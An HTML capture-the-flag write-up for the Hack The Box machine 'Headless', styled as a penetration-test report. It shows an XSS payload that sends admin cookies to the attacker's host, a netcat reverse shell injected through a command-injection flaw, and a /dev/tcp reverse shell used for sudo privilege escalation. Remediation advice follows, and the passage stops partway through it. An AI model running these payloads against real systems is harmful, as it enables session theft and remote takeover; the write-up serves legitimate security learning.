@@ -1,0 +1,846 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <!-- 
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+                -->
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div class="title-container">
+                    <img src="../images/icons/htb_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">Headless</h2>
+                </div>
+                
+                <img src="../images/Posts/Headless/Headless.png" alt="" class="right-machineimage">
+
+                <ul class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Statement-of-Confidentiality">1. Statement of Confidentiality</a></li>
+                    <li><a href="#Executive-Summary">2. Executive Summary</a></li>
+                    <ul>
+                        <li><a href="#Approach">2.1 Approach</a></li>
+                        <li><a href="#Scope">2.2 Scope</a></li>
+                        <li><a href="#Assessment-Overview-and-Recommendations">2.3 Assessment Overview and Recommendations</a></li>
+                    </ul>
+                    <li><a href="#Netwok-Penetration-Test-Assesment-Summary">3. Netwok Penetration Test Assesment Summary</a></li>
+                    <ul>
+                        <li><a href="#Summary-of-Findings">3.1 Summary of Findings</a></li>
+                    </ul>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough">4. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration">4.1 Enumeration</a></li>
+                        <li><a href="#Foothold">4.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation">4.3 Privilege Escalation</a></li>
+                    </ul>
+                    
+                    <li><a href="#Remmediation-Summary">5. Remmediation Summary</a></li>
+                    <ul>
+                        <li><a href="#Short-Term">5.1 Short Term</a></li>
+                        <li><a href="#Medium-Term">5.2 Medium Term</a></li>
+                        <li><a href="#Long-Term">5.3 Long Term</a></li>
+                    </ul>
+                    <li><a href="#Technical-Findings-Details">6. Technical Findings Details</a></li>
+                    <li><a href="#Conclusion">7. Conclusion</a></li>
+                    <li><a href="#Appendices">8. Appendices</a></li>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Headless WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Headless/Headless_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h1>Table of Contents</h1>
+                        <ul>
+                            <li><a href="#Statement-of-Confidentiality">1. Statement of Confidentiality</a></li>
+                            <li><a href="#Executive-Summary">2. Executive Summary</a></li>
+                            <ul>
+                                <li><a href="#Approach">2.1 Approach</a></li>
+                                <li><a href="#Scope">2.2 Scope</a></li>
+                                <li><a href="#Assessment-Overview-and-Recommendations">2.3 Assessment Overview and Recommendations</a></li>
+                            </ul>
+                            <li><a href="#Netwok-Penetration-Test-Assesment-Summary">3. Netwok Penetration Test Assesment Summary</a></li>
+                            <ul>
+                                <li><a href="#Summary-of-Findings">3.1 Summary of Findings</a></li>
+                            </ul>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough">4. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration">4.1 Enumeration</a></li>
+                                <li><a href="#Foothold">4.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation">4.3 Privilege Escalation</a></li>
+                            </ul>
+                            <li><a href="#Remmediation-Summary">5. Remmediation Summary</a></li>
+                            <ul>
+                                <li><a href="#Short-Term">5.1 Short Term</a></li>
+                                <li><a href="#Medium-Term">5.2 Medium Term</a></li>
+                                <li><a href="#Long-Term">5.3 Long Term</a></li>
+                            </ul>
+                            <li><a href="#Technical-Findings-Details">6. Technical Findings Details</a></li>
+                            <li><a href="#Conclusion">7. Conclusion</a></li>
+                            <li><a href="#Appendices">8. Appendices</a></li>
+                        </ul>
+                    </div>
+
+                    <div id="Statement-of-Confidentiality">
+                        <h1>1. Statement of Confidentiality</h1>
+                        <p>The information contained in this document is confidential and exclusive to Headless. This report must not be used, duplicated or disclosed to third parties without the express consent of Headless. Any violation of this confidentiality may have legal consequences.</p>
+                    </div>
+                    
+                    <div id="Executive-Summary">
+                        <h1>2. Executive Summary</h1>
+                        <p>We were hired by <strong>Headless</strong> to perform a security assessment and penetration testing on their internal network, with the aim of identifying vulnerabilities, assessing their impact, and validating the security mechanisms implemented. This report presents significant findings in a clear and reproducible manner, along with detailed recommendations for remediation.</p>
+                    </div>
+                    
+                    <div id="Approach">
+                        <h2>2.1 Approach:</h2>
+                        <p>The assessment was conducted using a <strong>black box</strong> approach between <strong>12/16/2024</strong> and <strong>12/17/2024</strong>, without any credentials or prior knowledge of <strong>Headless</strong> internal environment. The primary purpose was to identify potential unknown vulnerabilities. Testing was performed in a non-intrusive manner, seeking to uncover misconfigurations and security weaknesses. The process was performed remotely from a host dedicated exclusively to this assessment. Each identified vulnerability was documented and manually examined to assess its exploitation potential and escalation possibilities. An effort was made to demonstrate the full impact of each vulnerability, up to the point of compromising the internal network if possible.</p>
+                    </div>
+                    
+                    <div id="Scope">
+                        <h2>2.2 Scope:</h2>
+                        <p>The evaluation focuses on the <strong>Headless</strong> host only.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Host/URL/IP Adress</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>10.129.65.248</td>
+                                    <td>headless.htb</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 1: Scope Details</p>
+                    </div>
+
+                    <div id="Assessment-Overview-and-Recommendations">
+                        <h2>2.3 Assessment Overview and Recommendations:</h2>
+                        <p>During the internal penetration test against <strong>Headless</strong>, <strong>three</strong> vulnerabilities were identified that affect the confidentiality, integrity and availability of the information system. The findings were classified by severity level, and two (<strong>2</strong>) of them were assigned a high risk rating and one (<strong>1</strong>) a medium risk rating.</p>
+                        <p>The first finding detected was that the website in question is vulnerable to Cross-Site Scripting (<strong>XSS</strong>) in which an attacker can insert malicious code into the web, so that when a user visits that page the code is executed on their computers without them knowing it. This can allow the attacker to steal information or control a user's account. This can be minimized by ensuring that the web page properly filters everything that users can type (such as comments or forms) to prevent malicious code from being inserted. In addition, use technologies that help protect web pages from these attacks.</p>
+                        <p>Another finding was that arbitrary code can be injected into the web administrator panel. This vulnerability allows an attacker to enter commands that the operating system understands and that should normally only be executed by administrators. It should be verified that the systems that allow writing commands are protected and that only authorized users can use them. Using tools that prevent attackers from writing malicious commands on these systems is essential.</p>
+                        <p>Finally, it was found that important files within the system suffer from misconfiguration, which leads to privilege escalation. This happens when a normal user gains access to administrator permissions without having the necessary authorization. Properly configuring user permissions so that they cannot do things they should not is essential. Making sure that only administrators have access to important functions and regularly reviewing who has those permissions.</p>
+                    </div>
+
+                    <div id="Netwok-Penetration-Test-Assesment-Summary">
+                        <h1>3. Netwok Penetration Test Assesment Summary</h1>
+                        <p>All testing activities were started from the perspective of an unauthenticated user on the internal network. <strong>Headless</strong> provided us with access to the network via <strong>VPN</strong>, but no additional information such as operating system or configuration information was provided.</p>
+                    </div>
+                    
+                    <div id="Summary-of-Findings">
+                        <h1>3.1 Summary of Findings</h1>
+                        <p>During the course of testing, a total of three (<strong>3</strong>) findings were discovered that pose a material risk to <strong>Headless</strong> systems. The following table provides a summary of the findings by severity level.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th colspan="3">Finding Severity</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-level">
+                                    <td>High</td>
+                                    <td>Medium</td>
+                                    <td>Total</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-level-num">
+                                    <td id="red">2</td>
+                                    <td id="orange">1</td>
+                                    <td>3</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 2: Severity Summary</p>
+                        <p>Below is an overview of each finding identified during testing. These findings are discussed in depth in the <a href="#Technical-Findings-Details">Technical Findings Details</a> section of this report.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Finding #</th>
+                                    <th>Severity Level</th>
+                                    <th>Finding Name</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>1.</td>
+                                    <td id="red">High</td>
+                                    <td>Privilege escalation</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>2.</td>
+                                    <td id="red">High</td>
+                                    <td>Arbitrary Command Injection</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>3.</td>
+                                    <td id="orange">Medium</td>
+                                    <td>XSS (Cross-Site Scripting)</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 3: Finding List</p>
+                    </div>
+
+                    <div id="Internal-Network-Compromise-Walkthrough">
+                        <h1>4. Internal Network Compromise Walkthrough</h1>
+                        <p>This section will detail a full walkthrough of the machine exploitation process, broken down step-by-step. We will begin with the enumeration phase, which will scan for open ports, available services, and potential vulnerabilities in the system, including reviewing the web application if applicable. Next, we will delve deeper into active services and their configurations, and then move on to exploiting any identified vulnerabilities. Finally, we will cover privilege escalation, describing the techniques and tools used to gain access to the system as the highest-level user, thereby achieving full control of the machine.</p>
+                    </div>
+                    
+                    <div id="Enumeration">
+                        <h1>4.1 Enumeration</h1>
+                        <h3>Nmap</h3>
+                        <p>We start with the typical open port scanning with nmap.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -Pn -p- 10.129.65.248                                                                                                    
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 05:41 EST
+Initiating SYN Stealth Scan at 05:41
+Scanning 10.129.65.248 [65535 ports]
+Discovered open port 22/tcp on 10.129.65.248
+Discovered open port 5000/tcp on 10.129.65.248
+Completed SYN Stealth Scan at 05:42, 14.01s elapsed (65535 total ports)
+Nmap scan report for 10.129.65.248
+Host is up (0.036s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 14.08 seconds
+           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)                                
+                            </pre>
+                        </div>
+                        <p>From the above scan, two open ports are discovered.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22/tcp</td>
+                                    <td>SSH</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>5000/tcp</td>
+                                    <td>upnp</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p>We proceed with version enumeration and also run <strong>NSE</strong> scripts to gather information about possible vulnerabilities or service configurations with the `<strong>-sCV</strong>` parameter.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -Pn -sCV -p 22,5000 10.129.65.248 -oN scan.txt
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 05:43 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 05:43
+Completed NSE at 05:43, 0.00s elapsed
+Initiating NSE at 05:43
+Completed NSE at 05:43, 0.00s elapsed
+Initiating NSE at 05:43
+Completed NSE at 05:43, 0.00s elapsed
+Initiating SYN Stealth Scan at 05:43
+Scanning 10.129.65.248 [2 ports]
+Discovered open port 22/tcp on 10.129.65.248
+Discovered open port 5000/tcp on 10.129.65.248
+Completed SYN Stealth Scan at 05:43, 0.06s elapsed (2 total ports)
+Initiating Service scan at 05:43
+Scanning 2 services on 10.129.65.248
+Completed Service scan at 05:45, 92.79s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.65.248.
+Initiating NSE at 05:45
+Completed NSE at 05:45, 3.94s elapsed
+Initiating NSE at 05:45
+Completed NSE at 05:45, 1.04s elapsed
+Initiating NSE at 05:45
+Completed NSE at 05:45, 0.00s elapsed
+Nmap scan report for 10.129.65.248
+Host is up (0.037s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
+|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.2.2 Python/3.11.2
+|     Date: Mon, 16 Dec 2024 10:43:27 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 2799
+|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+|     Connection: close
+|     &lt;!DOCTYPE html>
+. 
+.
+.
+&lt;SNAP>
+SF:x20\x20\x20&lt;title>Error\x20response&lt;/title>\n\x20\x20\x20\x20&lt;/head>\n\
+SF:x20\x20\x20\x20&lt;body>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1>Error\x20res
+SF:ponse&lt;/h1>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p>Error\x20code:\x20400&lt;/p
+SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p>Message:\x20Bad\x20request\x20ver
+SF:sion\x20\('RTSP/1\.0'\)\.&lt;/p>\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p>Error
+SF:\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\
+SF:x20unsupported\x20method\.&lt;/p>\n\x20\x20\x20\x20&lt;/body>\n&lt;/html>\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 05:45
+Completed NSE at 05:45, 0.00s elapsed
+Initiating NSE at 05:45
+Completed NSE at 05:45, 0.00s elapsed
+Initiating NSE at 05:45
+Completed NSE at 05:45, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 98.12 seconds
+           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
+                            </pre>
+                        </div>
+                        <p>From the previous result we obtain the versions and services:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Version</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22</td>
+                                    <td>SSH</td>
+                                    <td>OpenSSH 9.2p1 Debian</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>5000</td>
+                                    <td>http/upnp?</td>
+                                    <td>?</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>HTTP</h3>
+                        <p>From the Nmap scan we discovered a web application running on a python server (Werkzeug). We navigated to port 5000 and found a 25 day countdown.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/1.png" alt="">
+                        </div>
+                        <p>This website is apparently under construction and there is also a button that directs us to a question form.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/2.png" alt="">
+                        </div>
+                        <h3>Cross-Site Scripting (XSS)</h3>
+                        <p>In this form it appears that we can send messages to staff members, we will test <strong>XSS</strong> payloads to see if it is vulnerable: `<strong>&lt;script>alert(1)&lt;/script></strong>`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/3.png" alt="">
+                        </div>                       
+                        <p>It seems to be secured and shows us a message saying that our <strong>IP</strong> has been flagged and the incident will be reported to the administrators.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/4.png" alt="">
+                        </div>
+                        <p>However, we can see that our request is reflected in the response so we return to the question field and this time we will use the <strong>Burpsuite</strong> tool to capture the request and manipulate it as needed.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/5.png" alt="">
+                        </div>
+                        <p><strong>Request in Burpsuite:</strong></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/6.png" alt="">
+                        </div>
+                        <p>From here, we can try to inject Javascript code into the "<strong>User-Agent</strong>" header of the request: <strong>&ltscript>alert('Hello!')&lt/script></strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/7.png" alt="">
+                        </div>
+                        <p>We send the request, the payload works, and we confirm that the website is vulnerable to <strong>XSS</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/8.png" alt="">
+                        </div>
+                        <p>When we read the warning on the page, it said that our request was sent directly to the administrators for review. With this information, what we can do is try to steal their cookies by performing an <strong>XSS</strong> that makes a request to one of our servers.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/9.png" alt="">
+                        </div>
+                        <p>We can use the following script for this: `<strong>&lt;script>var i=new Image(); i.src="http://10.10.14.42/?cookie="+btoa(document.cookie);&lt;/script></strong>`. This script creates an Image object in Javascript, which sends an HTTP GET request to our listening server with the victim's cookie Base64 encoded.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/10.png" alt="">
+                        </div>
+                        <p>We start a simple server with python on our machine, send the request through <strong>Burpsuite</strong> and wait for the response.</p>
+                        <div class="console-code">
+                            <pre>
+$ python3 -m http.server 80                                                      
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.14.42 - - [16/Dec/2024 06:49:28] "GET /?cookie=aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz HTTP/1.1" 200 -
+10.129.65.248 - - [16/Dec/2024 06:50:07] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/11.png" alt="">
+                        </div>
+                        <p>After waiting a few seconds, on our Python server, we receive 2 requests. By checking the IP's we can differentiate that the first cookie is from our session and the second one from another user on the target system, probably the admin user. We proceed to decode the second cookie and we get this:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= | base64 -d
+is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/12.png" alt="">
+                        </div>
+                        <p>Since we do not know where we can take advantage of this extracted cookie, we will perform web fuzzing to find directories of interest.</p>
+                        <h3>Fuzzing Web</h3>
+                        <div class="console-code">
+                            <pre>
+$ gobuster dir -u "http://10.129.65.248:5000/" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+                            </pre>
+                        </div>
+                        <p>We found the path <i>/dashboard</i></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/13.png" alt="">
+                        </div>
+                        <p>Going to the directory we do not have permissions to view the page.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/14.png" alt="">
+                        </div>
+                    </div>
+
+                    <div id="Foothold">
+                        <h2>4.2 Foothold</h2>
+                        <p>We proceed to use the cookie previously stolen via <strong>XSS</strong>. In <strong>Firefox</strong>, press the <strong>F12</strong> key, then click on the <strong>Storage > Cookies</strong> tab and edit the Value field with the previously stolen cookie.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/15.png" alt="">
+                        </div>
+                        <p>We refresh the page and it seems that we have access to an administrator panel.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/16.png" alt="">
+                        </div>
+                        <p>Clicking Generate Report says "<i>Systems are up and running!</i>".</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/17.png" alt="">
+                        </div>
+                        <p>We intercept the request with <strong>Burp Suite</strong> to study how the request is processed internally.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/18.png" alt="">
+                        </div>
+                        <p>We have a POST request with a `<strong>date</strong>` parameter. We will send the request on repeat and try to inject commands into this parameter.</p>
+                        <p>We test with `<strong>;id</strong>`, send the request, see our reflected command and confirm that it is vulnerable to command injection.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/19.png" alt="">
+                        </div>
+                        <p>To gain access to the system, we listen with netcat on port 4444 of our machine with the command:</p>
+                        <div class="console-code">
+                            <pre>
+$ nc -nvlp 4444                                            
+listening on [any] 4444 ...
+                            </pre>
+                        </div>
+                        <p>In <strong>Burpsuite</strong> we will use the urlencoded payload `<strong>;nc+-e+/bin/bash+10.10.14.42+4444</strong>`. We send the request and receive the reverse shell.</p>
+                        <div class="console-code">
+                            <pre>
+$ nc -nvlp 4444                                            
+listening on [any] 4444 ...
+connect to [10.10.14.42] from (UNKNOWN) [10.129.65.248] 57862
+id         
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
+
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/20.png" alt="">
+                        </div>
+                    </div>
+                    
+                    <div id="Privilege-Escalation">
+                        <h2>4.3 Privilege Escalation</h2>
+                        <p>Listing user permissions with `<strong>sudo -l</strong>` command we find:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/21.png" alt="">
+                        </div>
+                        <p>The <strong>dvir</strong> user can run <i>/usr/bin/syscheck</i> with root privileges and without a password.</p>
+                        <p>Checking the permissions we have on the file we discover that we can read it.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/22.png" alt="">
+                        </div>
+                        <p>What this script does is:</p>
+                        <div class="info-box-num">
+                            <ul>
+                                <li>Checks if it is running as <strong>root</strong> user.</li>
+                                <li>Finds and displays the last kernel modification.</li>
+                                <li>Displays the free space on the root partition.</li>
+                                <li>Displays the average system load.</li>
+                                <li>Checks the status of the database service and starts it if it is not running.</li>
+                            </ul>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/23.png" alt="">
+                        </div>
+                        <p>The interesting part of the script is that when the `<strong>initdb.sh</strong>` process is not found running on the system, it looks for it and executes it in the current directory.</p>
+                        <p>Since running <i>/usr/bin/syscheck</i> using sudo runs with root privileges, we can take advantage of this by creating a malicious script that sends a reverse shell to our attacking machine.</p>
+                        <p>We move to the <i>/tmp</i> directory, create the `<strong>initdb.sh</strong>` file with a reverse shell inside: `<strong>bash -i >& /dev/tcp/10.10.14.42/1234 0>&1</strong>` and give execution permissions.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/24.png" alt="">
+                        </div>
+                        <p>We listen on port 1234 on our attacker machine.</p>
+                        <div class="console-code">
+                            <pre>
+$ nc -nvlp 1234
+listening in [any] 1234 ...
+                            </pre>
+                        </div>
+                        <p>We run the script with the command `<strong>sudo /usr/bin/syscheck</strong>`</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/25.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.42] from (UNKNOWN) [10.129.65.248] 55628
+root@headless:/tmp# id &&ifconfig
+id &&ifconfig
+uid=0(root) gid=0(root) groups=0(root)
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.65.248  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 fe80::250:56ff:fe94:c60b  prefixlen 64  scopeid 0x20&lt;link>
+        inet6 dead:beef::250:56ff:fe94:c60b  prefixlen 64  scopeid 0x0&lt;global>
+        ether 00:50:56:94:c6:0b  txqueuelen 1000  (Ethernet)
+        RX packets 279408  bytes 23975916 (22.8 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 263863  bytes 32427817 (30.9 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 817  bytes 187745 (183.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 817  bytes 187745 (183.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@headless:/tmp# 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Headless/26.png" alt="">
+                        </div>
+                        <p>We finally receive the reverse shell as the highest privileged user on the system.</p>
+                    </div>
+
+                    <div id="Remmediation-Summary">
+                        <h1>5. Remmediation Summary</h1>
+                        <p>As a result of this assessment, there are several opportunities for <strong>Headless</strong>to strengthen the security of its internal network. Remediation efforts are then prioritized, starting with those likely to require the least amount of time and effort to complete. <strong>Headless</strong> must ensure that all remediation steps and mitigation controls are carefully planned and tested to prevent service interruptions or data loss.</p>
+                        <div id="Short-Term">
+                            <h2>5.1 Short Term</h2>
+                            <ul>
+                                <li><strong>XSS (Cross-Site Scripting) <span style="color: rgb(78, 211, 78);">[Finding 3]</span></strong></li>
+                                <ul>
+                                    <li>Filter and sanitize all user input in the admin panel. Use functions such as `<strong>htmlspecialchars()</strong>` to escape special characters, as well as implement security policies such as the <strong>Content Security Policy (CSP)</strong> to mitigate the risk of XSS.</li>
+                                    <li>Implement a <strong>Web Application Firewall (WAF)</strong> to preemptively block malicious requests.</li>
+                                </ul>
+                                <li><strong>Arbitrary Command Injection <span style="color: rgb(78, 211, 78);">[Finding 2]</span></strong></li>
+                                <ul>
+                                    <li>Ensure that admin panel parameters are properly validated. This includes using functions that do not allow the execution of system commands, such as `<strong>shell_exec()</strong>` or `<strong>exec()</strong>`, with data from untrusted input.</li>
+                                    <li><strong>Apply access controls</strong>: Limit the permissions of users who can interact with functionality susceptible to command injection.</li>
+                                </ul>
+                                <li><strong>Privilege Escalation <span style="color: rgb(78, 211, 78);">[Finding 1]</span></strong></li>
+                                <ul>
+                                    <li>Remove or restrict the ability of the "<strong>dvir</strong>" user to run the `<strong><i>/usr/bin/syscheck</i></strong>` script with root privileges without a password.</li>
+                                    <li><strong>Check</strong>: Verify that only authorized users and scripts have elevated permissions using the `<strong>sudo</strong>` command.</li>
+                                </ul>
+                            </ul>
+                        </div>
+                        <div id="Medium-Term">
+                            <h2>5.2 Medium Term</h2>
+                            <ul>
+                                <li><strong>XSS (Cross-Site Scripting) <span style="color: rgb(78, 211, 78);">[Finding 3]</span></strong></li>
+                                <ul>
+                                    <li>Implement a more robust server-side input validation and escaping process. This includes using security libraries and frameworks like <strong>OWASP ESAPI</strong> to handle data validation and encoding.</li>
+                                    <li>Perform regular audits of web applications to detect vulnerabilities like XSS, especially in user forms and admin panels.</li>
+                                </ul>
+                                <li><strong>Arbitrary Command Injection <span style="color: rgb(78, 211, 78);">[Finding 2]</span></strong></li>
